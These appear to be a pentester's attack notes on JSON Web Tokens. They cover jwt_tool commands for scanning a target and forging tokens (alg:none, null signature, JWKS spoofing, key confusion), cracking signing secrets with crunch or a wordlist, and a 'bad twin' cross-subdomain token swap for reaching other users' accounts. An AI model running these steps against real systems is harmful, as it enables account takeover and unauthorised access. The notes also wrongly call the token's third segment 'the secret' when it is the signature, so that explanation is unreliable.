Example token:
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiaWF0IjoxNTE2MjM5MDIyfQ.SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c

The first part is the algorith header, the second part is the payload data and the third is the secret SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c


1. First step:
- Intercept the request that has the authentication token
- Send it to sequencer
- LOcate the cookie
- Click on analyze now
- See if there is any predictability to see if the token can be manipulated due to randomness being not so random

2. JWT attacks:

                                                          Scanning jwt authentication requests:
                                                          jwt_tool -t http://target-name.com/ -rh "Authorization: Bearer JWT_Token" -M pb
    
2.1 Manipulation tests:
- jwt_tool eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiaWF0IjoxNTE2MjM5MDIyfQ.SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c -x a

 -X EXPLOIT, --exploit EXPLOIT
                        eXploit known vulnerabilities:
                        a = alg:none
                        n = null signature
                        b = blank password accepted in signature
                        s = spoof JWKS (specify JWKS URL with -ju, or set in jwtconf.ini to automate this attack)
                        k = key confusion (specify public key with -pk)
                        i = inject inline JWKS

2.2 Cracking the JWT token:
  2.2.1 Generate a wordlist:
. /crunch <min-len> <max-len> [charset] --> https://github.com/jim3ma/crunch

e.g: ./crunch 3 7 abcdef

This example will compute all passwords between 3 and 7 chars using 'abcdef' as the character set and dump it to stdout.

Or use a dictionary for attack:
Wordlist https://github.com/wallarm/jwt-secrets/blob/master/jwt.secrets.list

jwt_tool TOKEN -C -d /home/zabiol/Desktop/ctf/tools/wordlists/jwt/jwt_secret.txt

2.3 The bad twin attack:
  - Register on the main application
  - Decode the token if it is jwt
  - See if it contains any unique identifier and note it
  - Scan for subdomain that has the same login page like the main application
  - Register there with the same username and password used on the main application and note the token
  - Replace the main webb app token with the token from the staging app above
  - See if you get access to anybody elses account.

  
